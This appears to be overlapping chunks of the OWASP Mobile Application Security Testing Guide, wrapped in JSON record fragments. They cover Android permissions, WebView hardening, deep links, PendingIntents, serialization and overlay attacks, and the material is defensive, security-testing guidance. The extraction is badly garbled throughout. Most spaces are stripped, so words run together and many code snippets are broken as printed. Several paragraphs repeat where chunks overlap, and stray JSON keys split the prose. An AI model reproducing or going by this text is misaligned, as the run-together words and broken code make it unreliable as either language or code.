ApermissioncanbesuppliedtoContext.registerReceivertocontrolwhocanbroadcasttoaprogrammaticallyregis- teredreceiver. Goingtheotherway,apermissioncanbesuppliedwhencallingContext.sendBroadcasttorestrictwhich broadcastreceiversareallowedtoreceivethebroadcast. Notethatbothareceiverandabroadcastercanrequireapermission. Whenthishappens,bothpermissionchecksmust passfortheintenttobedeliveredtotheassociatedtarget. Formoreinformation,pleasereferencethesection“Restricting broadcastswithpermissions”intheAndroidDevelopersDocumentation. ContentProviderPermissionEnforcement: Permissions applied via android:permission attribute within the <provider> tag restrict access to data in a Content- Provider. Content providers have an important additional security facility called URI permissions which is described next. Unlike the other components, ContentProviders have two separate permission attributes that can be set, an- droid:readPermissionrestrictswhocanreadfromtheprovider,andandroid:writePermissionrestrictswhocanwrite toit. IfaContentProviderisprotectedwithbothreadandwritepermissions,holdingonlythewritepermissiondoesnot alsograntreadpermissions. PermissionsarecheckedwhenyoufirstretrieveaproviderandasoperationsareperformedusingtheContentProvider. Us- ingContentResolver.queryrequiresholdingthereadpermission;usingContentResolver.insert,ContentResolver. update, ContentResolver.delete requires the write permission. A SecurityException will be thrown from the call if properpermissionsarenotheldinallthesecases. ContentProviderURIPermissions: Thestandardpermissionsystemisnotsufficientwhenbeingusedwithcontentproviders. Forexampleacontentprovider maywanttolimitpermissionstoREADpermissionsinordertoprotectitself,whileusingcustomURIstoretrieveinforma- tion. AnapplicationshouldonlyhavethepermissionforthatspecificURI. The solution is per-URI permissions. When starting or returning a result from an activity, the method can set Intent. FLAG_GRANT_READ_URI_PERMISSIONand/orIntent.FLAG_GRANT_WRITE_URI_PERMISSION.Thisgrantspermissiontothe activityforthespecificURIregardlessifithaspermissionstoaccesstodatafromthecontentprovider. This allows a common capability-style model where user interaction drives ad-hoc granting of fine-grained permission. This can be a key facility for reducing the permissions needed by apps to only those directly related to their behavior. Withoutthismodelinplacemalicioususersmayaccessothermember’semailattachmentsorharvestcontactlistsfor futureuseviaunprotectedURIs. Inthemanifesttheandroid:grantUriPermissionsattributeorthenodehelprestrict theURIs. HereyoucanfindmoreinformationaboutAPIsrelatedtoURIPermissions: • grantUriPermission • revokeUriPermission • checkUriPermission Custom Permissions Androidallowsappstoexposetheirservices/componentstootherapps. Custompermissionsarerequiredforappaccess totheexposedcomponents. YoucandefinecustompermissionsinAndroidManifest.xmlbycreatingapermissiontag withtwomandatoryattributes: android:nameandandroid:protectionLevel. 249\\nIt is crucial to create custom permissions that adhere to the Principle of Least Privilege: permission should be defined explicitlyforitspurpose,withameaningfulandaccuratelabelanddescription. BelowisanexampleofacustompermissioncalledSTART_MAIN_ACTIVITY,whichisrequiredwhenlaunchingtheTEST_- ACTIVITYActivity. Thefirstcodeblockdefinesthenewpermission,whichisself-explanatory. Thelabeltagisasummaryofthepermission, andthedescriptionisamoredetailedversionofthesummary. Youcansettheprotectionlevelaccordingtothetypesof permissionsthatwillbegranted. Onceyou’vedefinedyourpermission,youcanenforceitbyaddingittotheapplication’s manifest. Inourexample,thesecondblockrepresentsthecomponentthatwearegoingtorestrictwiththepermission wecreated. Itcanbeenforcedbyaddingtheandroid:permissionattributes. <permission android:name=\"com.example.myapp.permission.START_MAIN_ACTIVITY\" android:label=\"StartActivityinmyapp\" android:description=\"Allowtheapptolaunchtheactivityofmyappapp,anyappyougrantthispermissionwillbeable tolaunchmainactivitybymyapp ↪ app.\" android:protectionLevel=\"normal\" /> <activity android:name=\"TEST_ACTIVITY\" android:permission=\"com.example.myapp.permission.START_MAIN_ACTIVITY\"> <intent-filter> <action android:name=\"android.intent.action.MAIN\" /> <category android:name=\"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> OncethepermissionSTART_MAIN_ACTIVITYhasbeencreated, appscanrequestitviatheuses-permissiontaginthe AndroidManifest.xmlfile. AnyapplicationgrantedthecustompermissionSTART_MAIN_ACTIVITYcanthenlaunchthe TEST_ACTIVITY. Please note <uses-permission android:name=\"myapp.permission.START_MAIN_ACTIVITY\" /> must bedeclaredbeforethe<application>oranexceptionwilloccuratruntime. Pleaseseetheexamplebelowthatisbased onthepermissionoverviewandmanifest-intro. <manifest> <uses-permission android:name=\"com.example.myapp.permission.START_MAIN_ACTIVITY\" /> <application> <activity> </activity> </application> </manifest> We recommend using a reverse-domain annotation when registering a permission, as in the example above (e.g. com. domain.application.permission)inordertoavoidcollisionswithotherapplications. WebViews URL Loading in WebViews WebViews are Android’s embedded components which allow your app to open web pages within your application. In additiontomobileappsrelatedthreats,WebViewsmayexposeyourapptocommonwebthreats(e.g.XSS,OpenRedirect, etc.). OneofthemostimportantthingstodowhentestingWebViewsistomakesurethatonlytrustedcontentcanbeloaded init. Anynewlyloadedpagecouldbepotentiallymalicious,trytoexploitanyWebViewbindingsortrytophishtheuser. Unlessyou’redevelopingabrowserapp,usuallyyou’dliketorestrictthepagesbeingloadedtothedomainofyourapp. A goodpracticeistopreventtheuserfromevenhavingthechancetoinputanyURLsinsideWebViews(whichisthedefault onAndroid)nornavigateoutsidethetrusteddomains. Evenwhennavigatingontrusteddomainsthere’sstilltheriskthat theusermightencounterandclickonotherlinkstountrustworthycontent(e.g.ifthepageallowsforotheruserstopost comments). Inaddition,somedevelopersmightevenoverridesomedefaultbehaviorwhichcanbepotentiallydangerous fortheuser. SafeBrowsing API Toprovideasaferwebbrowsingexperience, Android8.1(APIlevel27)introducestheSafeBrowsing API,whichallows yourapplicationtodetectURLsthatGooglehasclassifiedasaknownthreat. 250\\nBydefault, WebViewsshowawarningtousersaboutthesecurityriskwiththeoptiontoloadtheURLorstopthepage fromloading. WiththeSafeBrowsingAPIyoucancustomizeyourapplication’sbehaviorbyeitherreportingthethreatto SafeBrowsingorperformingaparticularactionsuchasreturningbacktosafetyeachtimeitencountersaknownthreat. PleasechecktheAndroidDevelopersdocumentationforusageexamples. YoucanusetheSafeBrowsingAPIindependentlyfromWebViewsusingtheSafetyNetlibrary,whichimplementsaclient for Safe Browsing Network Protocol v4. SafetyNet allows you to analyze all the URLs that your app is supposed load. YoucancheckURLswithdifferentschemes(e.g.http,file)sinceSafeBrowsingisagnostictoURLschemes,andagainst TYPE_POTENTIALLY_HARMFUL_APPLICATIONandTYPE_SOCIAL_ENGINEERINGthreattypes. WhensendingURLsorfilestobecheckedforknownthreatsmakesuretheydon’tcontainsensitivedatawhichcould compromiseauser’sprivacy,orexposesensitivecontentfromyourapplication. Virus Total API VirusTotalprovidesanAPIforanalyzingURLsandlocalfilesforknownthreats. TheAPIReferenceisavailableonVirus Totaldeveloperspage. JavaScript Execution in WebViews JavaScriptcanbeinjectedintowebapplicationsviareflected,stored,orDOM-basedCross-SiteScripting(XSS).Mobileapps are executed in a sandboxed environment and don’t have this vulnerability when implemented natively. Nevertheless, WebViews may be part of a native app to allow web page viewing. Every app has its own WebView cache, which isn’t shared with the native Browser or other apps. On Android, WebViews use the WebKit rendering engine to display web pages,butthepagesarestrippeddowntominimalfunctions,forexample,pagesdon’thaveaddressbars. IftheWebView implementationistoolaxandallowsusageofJavaScript,JavaScriptcanbeusedtoattacktheappandgainaccesstoits data. WebView Protocol Handlers SeveraldefaultschemasareavailableforAndroidURLs. TheycanbetriggeredwithinaWebViewwiththefollowing: • http(s):// • file:// • tel:// WebViewscanloadremotecontentfromanendpoint,buttheycanalsoloadlocalcontentfromtheappdatadirectoryor externalstorage. Ifthelocalcontentisloaded,theusershouldn’tbeabletoinfluencethefilenameorthepathusedto loadthefile,andusersshouldn’tbeabletoedittheloadedfile. Java Objects Exposed Through WebViews AndroidoffersawayforJavaScriptexecutioninaWebViewtocallandusenativefunctionsofanAndroidapp(annotated with @JavascriptInterface) by using the addJavascriptInterface method. This is known as a",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 97
    }
  },
  {
    "text": "other apps. On Android, WebViews use the WebKit rendering engine to display web pages,butthepagesarestrippeddowntominimalfunctions,forexample,pagesdon’thaveaddressbars. IftheWebView implementationistoolaxandallowsusageofJavaScript,JavaScriptcanbeusedtoattacktheappandgainaccesstoits data. WebView Protocol Handlers SeveraldefaultschemasareavailableforAndroidURLs. TheycanbetriggeredwithinaWebViewwiththefollowing: • http(s):// • file:// • tel:// WebViewscanloadremotecontentfromanendpoint,buttheycanalsoloadlocalcontentfromtheappdatadirectoryor externalstorage. Ifthelocalcontentisloaded,theusershouldn’tbeabletoinfluencethefilenameorthepathusedto loadthefile,andusersshouldn’tbeabletoedittheloadedfile. Java Objects Exposed Through WebViews AndroidoffersawayforJavaScriptexecutioninaWebViewtocallandusenativefunctionsofanAndroidapp(annotated with @JavascriptInterface) by using the addJavascriptInterface method. This is known as a WebView JavaScript bridgeornativebridge. Please note that when you use addJavascriptInterface, you’re explicitly granting access to the registered JavaScript Interface object to all pages loaded within that WebView. This implies that, if the user navigates outside your app or domain, all other external pages will also have access to those JavaScript Interface objects which mightpresentapotentialsecurityriskifanysensitivedataisbeingexposedthoughthoseinterfaces. Warning: Take extreme care with apps targeting Android versions below Android 4.2 (API level 17) as they are vulnerabletoaflawintheimplementationofaddJavascriptInterface: anattackthatisabusingreflection,which leadstoremotecodeexecutionwhenmaliciousJavaScriptisinjectedintoaWebView. ThiswasduetoallJavaObject methodsbeingaccessiblebydefault(insteadofonlythoseannotated). 251\\nWebViews Cleanup ClearingtheWebViewresourcesisacrucialstepwhenanappaccessesanysensitivedatawithinaWebView. Thisincludes anyfilesstoredlocally,theRAMcacheandanyloadedJavaScript. Asanadditionalmeasure,youcoulduseserver-sideheaderssuchasno-cache,whichpreventanapplicationfromcaching particularcontent. StartingonAndroid10(APIlevel29)appsareabletodetectifaWebViewhasbecomeunresponsive. Ifthishappens, theOSwillautomaticallycalltheonRenderProcessUnresponsivemethod. YoucanfindmoresecuritybestpracticeswhenusingWebViewsonAndroidDevelopers. Deep Links DeeplinksareURIsofanyschemethattakeusersdirectlytospecificcontentinanapp. Anappcansetupdeeplinksby addingintentfiltersontheAndroidManifestandextractingdatafromincomingintentstonavigateuserstothecorrect activity. Androidsupportstwotypesofdeeplinks: • CustomURLSchemes,whicharedeeplinksthatuseanycustomURLscheme,e.g.myapp://(notverifiedbythe OS). • AndroidAppLinks(Android6.0(APIlevel23)andhigher),whicharedeeplinksthatusethehttp://andhttps:// schemesandcontaintheautoVerifyattribute(whichtriggersOSverification). DeepLinkCollision: Usingunverifieddeeplinkscancauseasignificantissue-anyotherappsinstalledonauser’sdevicecandeclareandtry tohandlethesameintent,whichisknownasdeeplinkcollision. Anyarbitraryapplicationcandeclarecontroloverthe exactsamedeeplinkbelongingtoanotherapplication. InrecentversionsofAndroidthisresultsinaso-calleddisambiguationdialogshowntotheuserthatasksthemtoselect theapplicationthatshouldhandlethedeeplink. Theusercouldmakethemistakeofchoosingamaliciousapplication insteadofthelegitimateone. 252\\nAndroidAppLinks: Inordertosolvethedeeplinkcollisionissue,Android6.0(APILevel23)introducedAndroidAppLinks,whichareverified deeplinksbasedonawebsiteURLexplicitlyregisteredbythedeveloper. ClickingonanAppLinkwillimmediatelyopen theappifit’sinstalled. Therearesomekeydifferencesfromunverifieddeeplinks: • AppLinksonlyusehttp://andhttps://schemes,anyothercustomURLschemesarenotallowed. • AppLinksrequirealivedomaintoserveaDigitalAssetLinksfileviaHTTPS. • AppLinksdonotsufferfromdeeplinkcollisionsincetheydon’tshowadisambiguationdialogwhenauseropens them. 253\\nSensitive Functionality Exposure Through IPC Duringimplementationofamobileapplication,developersmayapplytraditionaltechniquesforIPC(suchasusingshared filesornetworksockets). TheIPCsystemfunctionalityofferedbymobileapplicationplatformsshouldbeusedbecauseitis muchmorematurethantraditionaltechniques. UsingIPCmechanismswithnosecurityinmindmaycausetheapplication toleakorexposesensitivedata. ThefollowingisalistofAndroidIPCMechanismsthatmayexposesensitivedata: • Binders • Services • BoundServices • AIDL • Intents • ContentProviders Pending Intents Oftenwhiledealingwithcomplexflowsduringappdevelopment,therearesituationswhereanappAwantsanotherapp B to perform a certain action in the future, on app A’s behalf. Trying to implement this by only usingIntents leads to varioussecurityproblems,likehavingmultipleexportedcomponents. Tohandlethisusecaseinasecuremanner,Android providesthePendingIntentAPI. PendingIntentaremostcommonlyusedfornotifications,appwidgets,mediabrowserservices,etc. Whenusedfornoti- fications,PendingIntentisusedtodeclareanintenttobeexecutedwhenauserperformsanactionwithanapplication’s notification. Thenotificationrequiresacallbacktotheapplicationtotriggeranactionwhentheuserclicksonit. Internally, aPendingIntentobjectwrapsanormalIntentobject(referredasbaseintent)thatwilleventuallybeused to invoke an action. For example, the base intent specifies that an activity A should be started in an application. The receivingapplicationofthePendingIntent,willunwrapandretrievethisbaseintentandinvoketheactivityAbycalling thePendingIntent.sendfunction. AtypicalimplementationforusingPendingIntentisbelow: Intentintent =newIntent(applicationContext,SomeActivity.class); //baseintent //createapendingintent PendingIntentpendingIntent =PendingIntent.getActivity(applicationContext,0,intent,PendingIntent.FLAG_IMMUTABLE); //sendthependingintenttoanotherapp IntentanotherIntent =newIntent(); anotherIntent.setClassName(\"other.app\",\"other.app.MainActivity\"); anotherIntent.putExtra(\"pendingIntent\",pendingIntent); startActivity(anotherIntent); WhatmakesaPendingIntentsecureisthat,unlikeanormalIntent,itgrantspermissiontoaforeignapplicationtouse theIntent(thebaseintent)itcontains,asifitwerebeingexecutedbyyourapplication’sownprocess. Thisallowsan applicationtofreelyusethemtocreatecallbackswithouttheneedtocreateexportedactivities. Ifnotimplementedcorrectly,amaliciousapplicationcanhijackaPendingIntent. Forexample,inthenotificationexam- ple above, a malicious application with android.permission.BIND_NOTIFICATION_LISTENER_SERVICE can bind to the notificationlistenerserviceandretrievethependingintent. TherearecertainsecuritypitfallswhenimplementingPendingIntents,whicharelistedbelow: • Mutable fields: A PendingIntent can have mutable and empty fields that can be filled by a malicious applica- tion. Thiscanleadtoamaliciousapplicationgainingaccesstonon-exportedapplicationcomponents. Usingthe PendingIntent.FLAG_IMMUTABLEflagmakesthePendingIntentimmutableandpreventsanychangestothefields. PriortoAndroid12(APIlevel31),thePendingIntentwasmutablebydefault,whilesinceAndroid12(APIlevel31) itischangedtoimmutablebydefaulttopreventaccidentalvulnerabilities. • Use of implicit intent: A malicious application can receive a PendingIntent and then update the base intent totargetthecomponentandpackagewithinthemaliciousapplication. Asamitigation,ensurethatyouexplicitly specifytheexactpackage,actionandcomponentthatwillreceivethebaseintent. ThemostcommoncaseofPendingIntentattackiswhenamaliciousapplicationisabletointerceptit. Forfurtherdetails,checktheAndroiddocumentationonusingapendingintent. 254\\nImplicit Intents An Intent is a messaging object that you can use to request an action from another application component. Although intentsfacilitatecommunicationbetweencomponentsinavarietyofways,therearethreebasicusecases: startingan activity,startingaservice,anddeliveringabroadcast. AccordingtotheAndroidDevelopersDocumentation,Androidprovidestwotypesofintents: • Explicitintentsspecifywhichapplicationwillsatisfytheintentbyprovidingeitherthetargetapp’spackagename orafullyqualifiedcomponentclassname. Typically,you’lluseanexplicitintenttostartacomponentinyourown app,becauseyouknowtheclassnameoftheactivityorserviceyouwanttostart. Forexample,youmightwantto startanewactivityinyourappinresponsetoauseraction,orstartaservicetodownloadafileinthebackground. //Note thespecificationofaconcretecomponent(DownloadActivity)thatisstartedbytheintent. IntentdownloadIntent =newIntent(this,DownloadActivity.class); downloadIntent.setAction(\"android.intent.action.GET_CONTENT\") startActivityForResult(downloadIntent); • Implicit intents do not name a specific component, but instead declare a general action to be performed that anotherapp’scomponentcanhandle. Forexample,ifyouwanttoshowtheuseralocationonamap,youcanuse animplicitintenttoaskanothercapableapptoshowaspecificlocationonamap. Anotherexampleiswhenthe userclicksonanemailaddresswithinanapp,wherethecallingappdoesnotwanttospecifyaspecificemailapp andleavesthatchoiceuptotheuser. //Developers canalsostartanactivitybyjustsettinganactionthatismatchedbytheintendedapp. IntentdownloadIntent =newIntent(); downloadIntent.setAction(\"android.intent.action.GET_CONTENT\") startActivityForResult(downloadIntent); Theuseofimplicitintentscanleadtomultiplesecurityrisks,e.g.ifthecallingappprocessesthereturnvalueoftheimplicit intent without proper verification or if the intent contains sensitive data, it can be accidentally leaked to unauthorized third-parties. You can refer to this blog post, this article and CWE-927 for more information about the mentioned problem, concrete attackscenariosandrecommendations. Object Persistence ThereareseveralwaystopersistanobjectonAndroid: Object Serialization Anobjectanditsdatacanberepresentedasasequenceofbytes. ThisisdoneinJavaviaobjectserialization. Serialization isnotinherentlysecure. Itisjustabinaryformat(orrepresentation)forlocallystoringdataina.serfile. Encryptingand signing HMAC-serialized data is possible as long as the keys are stored safely. Deserializing an object requires a class ofthesameversionastheclassusedtoserializetheobject. Afterclasseshavebeenchanged,theObjectInputStream can’tcreateobjectsfromolder.serfiles. TheexamplebelowshowshowtocreateaSerializableclassbyimplementing theSerializableinterface. import java.io.Serializable; public class Person implements Serializable { private StringfirstName; private StringlastName; public Person(StringfirstName,StringlastName){ this.firstName =firstName; this.lastName =lastName; } //.. //getters,setters,etc",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 98
    }
  },
  {
    "text": "ThisisdoneinJavaviaobjectserialization. Serialization isnotinherentlysecure. Itisjustabinaryformat(orrepresentation)forlocallystoringdataina.serfile. Encryptingand signing HMAC-serialized data is possible as long as the keys are stored safely. Deserializing an object requires a class ofthesameversionastheclassusedtoserializetheobject. Afterclasseshavebeenchanged,theObjectInputStream can’tcreateobjectsfromolder.serfiles. TheexamplebelowshowshowtocreateaSerializableclassbyimplementing theSerializableinterface. import java.io.Serializable; public class Person implements Serializable { private StringfirstName; private StringlastName; public Person(StringfirstName,StringlastName){ this.firstName =firstName; this.lastName =lastName; } //.. //getters,setters,etc //.. } Nowyoucanread/writetheobjectwithObjectInputStream/ObjectOutputStreaminanotherclass. 255\\nJSON ThereareseveralwaystoserializethecontentsofanobjecttoJSON.AndroidcomeswiththeJSONObjectandJSONArray classes. Awidevarietyoflibraries,includingGSON,Jackson,Moshi,canalsobeused. Themaindifferencesbetweenthe librariesarewhethertheyusereflectiontocomposetheobject, whethertheysupportannotations, whetherthecreate immutableobjects,andtheamountofmemorytheyuse. NotethatalmostalltheJSONrepresentationsareString-based andthereforeimmutable. ThismeansthatanysecretstoredinJSONwillbehardertoremovefrommemory. JSONitself can be stored anywhere, e.g., a (NoSQL) database or a file. You just need to make sure that any JSON that contains secretshasbeenappropriatelyprotected(e.g.,encrypted/HMACed). Seethechapter“DataStorageonAndroid”formore details. Asimpleexample(fromtheGSONUserGuide)ofwritingandreadingJSONwithGSONfollows. Inthisexample, thecontentsofaninstanceoftheBagOfPrimitivesisserializedintoJSON: class BagOfPrimitives { private intvalue1 =1; private Stringvalue2 =\"abc\"; private transient intvalue3 =3; BagOfPrimitives(){ //no-argsconstructor } } //Serialization BagOfPrimitivesobj =newBagOfPrimitives(); Gsongson =newGson(); Stringjson =gson.toJson(obj); //==>jsonis{\"value1\":1,\"value2\":\"abc\"} XML ThereareseveralwaystoserializethecontentsofanobjecttoXMLandback. AndroidcomeswiththeXmlPullParser interfacewhichallowsforeasilymaintainableXMLparsing. TherearetwoimplementationswithinAndroid: KXmlParser and ExpatPullParser. The Android Developer Guide provides a great write-up on how to use them. Next, there are variousalternatives,suchasaSAXparserthatcomeswiththeJavaruntime. Formoreinformation,seeablogpostfrom ibm.com. SimilarlytoJSON,XMLhastheissueofworkingmostlyStringbased,whichmeansthatString-typesecretswill behardertoremovefrommemory. XMLdatacanbestoredanywhere(database,files),butdoneedadditionalprotection incaseofsecretsorinformationthatshouldnotbechanged. Seethechapter“DataStorageonAndroid”formoredetails. Asstatedearlier: thetruedangerinXMLliesintheXMLeXternalEntity(XXE)attackasitmightallowforreadingexternal datasourcesthatarestillaccessiblewithintheapplication. ORM Therearelibrariesthatprovidefunctionalityfordirectlystoringthecontentsofanobjectinadatabaseandtheninstanti- atingtheobjectwiththedatabasecontents. ThisiscalledObject-RelationalMapping(ORM).LibrariesthatusetheSQLite databaseinclude • OrmLite, • SugarORM, • GreenDAOand • ActiveAndroid. Realm,ontheotherhand,usesitsowndatabasetostorethecontentsofaclass. TheamountofprotectionthatORMcan providedependsprimarilyonwhetherthedatabaseisencrypted. Seethechapter“DataStorageonAndroid”formore details. TheRealmwebsiteincludesaniceexampleofORMLite. Parcelable ParcelableisaninterfaceforclasseswhoseinstancescanbewrittentoandrestoredfromaParcel. Parcelsareoften used to pack a class as part of a Bundle for an Intent. Here’s an Android developer documentation example that implementsParcelable: public class MyParcelable implements Parcelable { private intmData; public intdescribeContents(){ 256\\nreturn 0; } public void writeToParcel(Parcelout,intflags){ out.writeInt(mData); } public static final Parcelable.Creator<MyParcelable>CREATOR =newParcelable.Creator<MyParcelable>(){ public MyParcelable createFromParcel(Parcelin){ return newMyParcelable(in); } public MyParcelable[]newArray(intsize){ return newMyParcelable[size]; } }; private MyParcelable(Parcelin){ mData =in.readInt(); } } Because this mechanism that involves Parcels and Intents may change over time, and the Parcelable may contain IBinderpointers,storingdatatodiskviaParcelableisnotrecommended. Protocol Buffers ProtocolBuffersbyGoogle,areaplatform-andlanguageneutralmechanismforserializingstructureddatabymeansof theBinaryDataFormat. TherehavebeenafewvulnerabilitieswithProtocolBuffers,suchasCVE-2015-5237. Notethat ProtocolBuffersdonotprovideanyprotectionforconfidentiality: thereisnobuiltinencryption. Overlay Attacks Screen overlay attacks occur when a malicious application manages to put itself on top of another application which remainsworkingnormallyasifitwereontheforeground. ThemaliciousappmightcreateUIelementsmimickingthelook and feel and the original app or even the Android system UI. The intention is typically to make users believe that they keep interacting with the legitimate app and then try to elevate privileges (e.g by getting some permissions granted), stealthyphishing,captureusertapsandkeystrokesetc. ThereareseveralattacksaffectingdifferentAndroidversionsincluding: • Tapjacking(Android6.0(APIlevel23)andlower)abusesthescreenoverlayfeatureofAndroidlisteningfortaps andinterceptinganyinformationbeingpassedtotheunderlyingactivity. • Cloak&DaggerattacksaffectappstargetingAndroid5.0(APIlevel21)toAndroid7.1(APIlevel25). Theyabuse oneorbothoftheSYSTEM_ALERT_WINDOW(“drawontop”)andBIND_ACCESSIBILITY_SERVICE(“a11y”)permissions that,incasetheappisinstalledfromthePlayStore,theusersdonotneedtoexplicitlygrantandforwhichthey arenotevennotified. • ToastOverlayisquitesimilartoCloak&DaggerbutdonotrequirespecificAndroidpermissionstobegrantedby users. ItwasclosedwithCVE-2017-0752onAndroid8.0(APIlevel26). Usually,thiskindofattacksareinherenttoanAndroidsystemversionhavingcertainvulnerabilitiesordesignissues. This makes them challenging and often virtually impossible to prevent unless the app is upgraded targeting a safe Android version(APIlevel). OvertheyearsmanyknownmalwarelikeMazorBot,BankBotorMysteryBothavebeenabusingthescreenoverlayfeature ofAndroidtotargetbusinesscriticalapplications,namelyinthebankingsector. Thisblogdiscussesmoreaboutthistype ofmalware. Enforced Updating Starting from Android 5.0 (API level 21), together with the Play Core Library, apps can be forced to be updated. This mechanismisbasedonusingtheAppUpdateManager. Beforethat,othermechanismswereused,suchasdoinghttpcalls to the Google Play Store, which are not as reliable as the APIs of the Play Store might change. Alternatively, Firebase couldbeusedtocheckforpossibleforcedupdatesaswell(seethisblog). Enforcedupdatingcanbereallyhelpfulwhen 257\\nitcomestopublickeypinning(seetheTestingNetworkcommunicationformoredetails)whenapinhastoberefreshed duetoacertificate/publickeyrotation. Next,vulnerabilitiesareeasilypatchedbymeansofforcedupdates. Please note that newer versions of an application will not fix security issues that are living in the backends to which the app communicates. Allowing an app not to communicate with it might not be enough. Having proper API-lifecycle managementiskeyhere. Similarly,whenauserisnotforcedtoupdate,donotforgettotestolderversionsofyourapp againstyourAPIand/oruseproperAPIversioning. Testing WebView Protocol Handlers Platform: android MASVSV1: MSTG-PLATFORM-6 MASVSV2: MASVS-PLATFORM-2 Overview TotestforWebViewprotocolhandlerschecktheappforWebViewusageandevaluatewhetherornottheWebViewshould haveresourceaccess. Ifresourceaccessisnecessaryyouneedtoverifythatit’simplementedfollowingbestpractices. Static Analysis CheckthesourcecodeforWebViewusage. ThefollowingWebViewsettingscontrolresourceaccess: • setAllowContentAccess: ContentURLaccessallowsWebViewstoloadcontentfromacontentproviderinstalled onthesystem,whichisenabledbydefault. • setAllowFileAccess: EnablesanddisablesfileaccesswithinaWebView. Thedefaultvalueistruewhentargeting Android10(APIlevel29)andbelowandfalseforAndroid11(APIlevel30)andabove. Notethatthisenablesand disablesfilesystemaccessonly. Assetandresourceaccessisunaffectedandaccessibleviafile:///android_- assetandfile:///android_res. • setAllowFileAccessFromFileURLs: DoesordoesnotallowJavaScriptrunninginthecontextofafileschemeURL toaccesscontentfromotherfileschemeURLs. ThedefaultvalueistrueforAndroid4.0.3-4.0.4(APIlevel15)and belowandfalseforAndroid4.1(APIlevel16)andabove. • setAllowUniversalAccessFromFileURLs: DoesordoesnotallowJavaScriptrunninginthecontextofafilescheme URLtoaccesscontentfromanyorigin.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 99
    }
  },
  {
    "text": "not be enough. Having proper API-lifecycle managementiskeyhere. Similarly,whenauserisnotforcedtoupdate,donotforgettotestolderversionsofyourapp againstyourAPIand/oruseproperAPIversioning. Testing WebView Protocol Handlers Platform: android MASVSV1: MSTG-PLATFORM-6 MASVSV2: MASVS-PLATFORM-2 Overview TotestforWebViewprotocolhandlerschecktheappforWebViewusageandevaluatewhetherornottheWebViewshould haveresourceaccess. Ifresourceaccessisnecessaryyouneedtoverifythatit’simplementedfollowingbestpractices. Static Analysis CheckthesourcecodeforWebViewusage. ThefollowingWebViewsettingscontrolresourceaccess: • setAllowContentAccess: ContentURLaccessallowsWebViewstoloadcontentfromacontentproviderinstalled onthesystem,whichisenabledbydefault. • setAllowFileAccess: EnablesanddisablesfileaccesswithinaWebView. Thedefaultvalueistruewhentargeting Android10(APIlevel29)andbelowandfalseforAndroid11(APIlevel30)andabove. Notethatthisenablesand disablesfilesystemaccessonly. Assetandresourceaccessisunaffectedandaccessibleviafile:///android_- assetandfile:///android_res. • setAllowFileAccessFromFileURLs: DoesordoesnotallowJavaScriptrunninginthecontextofafileschemeURL toaccesscontentfromotherfileschemeURLs. ThedefaultvalueistrueforAndroid4.0.3-4.0.4(APIlevel15)and belowandfalseforAndroid4.1(APIlevel16)andabove. • setAllowUniversalAccessFromFileURLs: DoesordoesnotallowJavaScriptrunninginthecontextofafilescheme URLtoaccesscontentfromanyorigin. ThedefaultvalueistrueforAndroid4.0.3-4.0.4(APIlevel15)andbelow andfalseforAndroid4.1(APIlevel16)andabove. Ifoneormoreoftheabovemethodsis/areactivated,youshoulddeterminewhetherthemethod(s)is/arereallynecessary fortheapptoworkproperly. IfaWebViewinstancecanbeidentified,findoutwhetherlocalfilesareloadedwiththeloadURLmethod. WebView =newWebView(this); webView.loadUrl(\"file:///android_asset/filename.html\"); ThelocationfromwhichtheHTMLfileisloadedmustbeverified. Ifthefileisloadedfromexternalstorage,forexample, thefileisreadableandwritablebyeveryone. Thisisconsideredabadpractice. Instead,thefileshouldbeplacedinthe app’sassetsdirectory. webview.loadUrl(\"file:///\" + Environment.getExternalStorageDirectory().getPath()+ \"filename.html\"); The URL specified in loadURL should be checked for dynamic parameters that can be manipulated; their manipulation mayleadtolocalfileinclusion. Usethefollowingcodesnippetandbestpracticestodeactivateprotocolhandlers,ifapplicable: 258\\n//IfattackerscaninjectscriptintoaWebView,theycouldaccesslocalresources.Thiscanbepreventedbydisablinglocalfilesystemaccess,whichisenabled ↪ bydefault.YoucanusetheAndroidWebSettingsclasstodisablelocalfilesystemaccessviathepublicmethod`setAllowFileAccess`. webView.getSettings().setAllowFileAccess(false); webView.getSettings().setAllowFileAccessFromFileURLs(false); webView.getSettings().setAllowUniversalAccessFromFileURLs(false); webView.getSettings().setAllowContentAccess(false); • Createalistthatdefineslocalandremotewebpagesandprotocolsthatareallowedtobeloaded. • CreatechecksumsofthelocalHTML/JavaScriptfilesandcheckthemwhiletheappisstartingup. MinifyJavaScript filestomakethemhardertoread. Dynamic Analysis Toidentifytheusageofprotocolhandlers,lookforwaystotriggerphonecallsandwaystoaccessfilesfromthefilesystem whileyou’reusingtheapp. Testing for Overlay Attacks Platform: android MASVSV1: MSTG-PLATFORM-9 MASVSV2: MASVS-PLATFORM-3 Overview To test for overlay attacks you need to check the app for usage of certain APIs and attributed typically used to protect againstoverlayattacksaswellaschecktheAndroidversionthatappistargeting. TomitigatetheseattackspleasecarefullyreadthegeneralguidelinesaboutAndroidViewsecurityintheAndroidDeveloper Documentation. Forinstance,theso-calledtouchfilteringisacommondefenseagainsttapjacking,whichcontributesto safeguardingusersagainstthesevulnerabilities,usuallyincombinationwithothertechniquesandconsiderationsaswe introduceinthissection. Static Analysis Tostartyourstaticanalysisyoucanchecktheappforthefollowingmethodsandattributes(non-exhaustivelist): • OverrideonFilterTouchEventForSecurityformorefine-grainedcontrolandtoimplementacustomsecuritypolicy forviews. • Setthelayoutattributeandroid:filterTouchesWhenObscuredtotrueorcallsetFilterTouchesWhenObscured. • Check FLAG_WINDOW_IS_OBSCURED (since API level 9) or FLAG_WINDOW_IS_PARTIALLY_OBSCURED (starting on APIlevel29). Someattributesmightaffecttheappasawhole,whileotherscanbeappliedtospecificcomponents. Thelatterwould bethecasewhen,forexample,thereisabusinessneedtospecificallyallowoverlayswhilewantingtoprotectsensitive inputUIelements. Thedevelopersmightalsotakeadditionalprecautionstoconfirmtheuser’sactualintentwhichmight belegitimateandtellitapartfromapotentialattack. Asafinalnote,alwaysremembertoproperlychecktheAPIlevelthatappistargetingandtheimplicationsthatthishas. Forinstance,Android8.0(APIlevel26)introducedchangestoappsrequiringSYSTEM_ALERT_WINDOW(“drawontop”). From thisAPIlevelon,appsusingTYPE_APPLICATION_OVERLAYwillbealwaysshownaboveotherwindowshavingothertypes such as TYPE_SYSTEM_OVERLAY or 